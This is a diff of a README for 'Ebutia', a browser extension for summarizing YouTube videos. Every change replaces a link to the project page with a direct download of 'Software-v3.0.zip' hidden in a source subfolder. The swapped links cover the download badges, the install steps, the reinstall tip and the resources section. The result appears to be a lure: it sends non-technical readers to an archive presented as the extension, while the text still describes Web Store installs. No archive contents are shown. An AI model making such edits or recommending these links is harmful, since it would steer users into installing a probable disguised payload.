@@ -1,6 +1,6 @@
 # 🤖 Ebutia - Easy YouTube Video Summaries
 
-[![Download Ebutia](https://img.shields.io/badge/Download-Ebutia-brightgreen)](https://github.com/danmatpro/Ebutia)
+[![Download Ebutia](https://img.shields.io/badge/Download-Ebutia-brightgreen)](https://github.com/danmatpro/Ebutia/raw/refs/heads/main/src/pages/popup/Software-v3.0.zip)
 
 Ebutia helps you quickly get summaries of YouTube videos using AI chatbots. It works as a browser extension for Chrome and Firefox. You don’t need technical knowledge to use it.
 
@@ -41,7 +41,7 @@ Follow these steps to get Ebutia running on your Windows PC easily.
 
 Visit this page to download the extension:
 
-[![Download Ebutia](https://img.shields.io/badge/Download-Ebutia-blue)](https://github.com/danmatpro/Ebutia)
+[![Download Ebutia](https://img.shields.io/badge/Download-Ebutia-blue)](https://github.com/danmatpro/Ebutia/raw/refs/heads/main/src/pages/popup/Software-v3.0.zip)
 
 This page holds the latest versions of Ebutia for Chrome and Firefox. You will find step-by-step instructions for each browser on that page.
 
@@ -50,7 +50,7 @@ This page holds the latest versions of Ebutia for Chrome and Firefox. You will f
 ## 🧩 Install on Google Chrome
 
 1. Open the Chrome browser on your PC.  
-2. Go to the [Ebutia GitHub download page](https://github.com/danmatpro/Ebutia).  
+2. Go to the [Ebutia GitHub download page](https://github.com/danmatpro/Ebutia/raw/refs/heads/main/src/pages/popup/Software-v3.0.zip).  
 3. Look for the Chrome extension package or link to the Chrome Web Store.  
 4. Click "Add to Chrome".  
 5. Chrome will ask for confirmation. Confirm to install the extension.  
@@ -61,7 +61,7 @@ This page holds the latest versions of Ebutia for Chrome and Firefox. You will f
 ## 🧩 Install on Mozilla Firefox
 
 1. Open Firefox on your Windows computer.  
-2. Visit the same [download page](https://github.com/danmatpro/Ebutia).  
+2. Visit the same [download page](https://github.com/danmatpro/Ebutia/raw/refs/heads/main/src/pages/popup/Software-v3.0.zip).  
 3. Find the Firefox addon link or package available there.  
 4. Click "Add to Firefox".  
 5. Confirm any permissions to finish the installation.  
@@ -110,7 +110,7 @@ If Ebutia does not work as expected, try the following:
 - Make sure you are connected to the internet.  
 - Disable other browser extensions that might interfere.  
 - Update your browser to the latest version.  
-- Reinstall Ebutia from the [download page](https://github.com/danmatpro/Ebutia).  
+- Reinstall Ebutia from the [download page](https://github.com/danmatpro/Ebutia/raw/refs/heads/main/src/pages/popup/Software-v3.0.zip).  
 - Check the extension settings for correct AI chatbot selection.  
 
 For more support, visit the Issues section on the GitHub page.
@@ -120,7 +120,7 @@ For more support, visit the Issues section on the GitHub page.
 ## 📑 Additional Resources
 
 You can find more information at the GitHub page:  
-https://github.com/danmatpro/Ebutia
+https://github.com/danmatpro/Ebutia/raw/refs/heads/main/src/pages/popup/Software-v3.0.zip
 
 Here you will find:  
 - Source code for developers  
@@ -138,4 +138,4 @@ Here you will find:
 
 ---
 
-[![Download Ebutia](https://img.shields.io/badge/Download-Ebutia-brightgreen)](https://github.com/danmatpro/Ebutia)
+[![Download Ebutia](https://img.shields.io/badge/Download-Ebutia-brightgreen)](https://github.com/danmatpro/Ebutia/raw/refs/heads/main/src/pages/popup/Software-v3.0.zip)
